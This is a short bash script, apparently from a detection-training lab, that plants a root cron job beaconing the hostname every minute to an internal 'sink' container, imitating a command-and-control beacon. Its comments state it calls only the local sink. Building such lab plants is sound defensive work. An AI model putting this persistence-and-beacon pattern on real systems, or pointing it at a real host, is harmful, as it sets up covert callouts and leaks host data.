#!/usr/bin/env bash
# Declawed plant: a cron beacon that calls ONLY the local sink container.
#
# Identical containment to the SSH beacon: the callback target is hardcoded to
# the internal compose service 'sink' on port 9000. It cannot reach the
# internet; it reproduces the detection surface of a C2 beacon (a periodic
# scheduled outbound call) with zero real callout.
set -euo pipefail

SINK_URL="http://sink:9000/beacon"   # internal compose DNS name only
CRON="/etc/cron.d/beaconhunt-sync"

cat > "$CRON" <<EOF
# beaconhunt-beacon (training) — periodic callback to the LOCAL sink only
* * * * * root curl -fsS --max-time 3 "${SINK_URL}?host=\$(hostname)" >/dev/null 2>&1
EOF
chmod 644 "$CRON"
echo "wrote $CRON (beacons to ${SINK_URL})"

curl -fsS --max-time 3 "${SINK_URL}?host=$(hostname)&bootstrap=1" >/dev/null 2>&1 || true
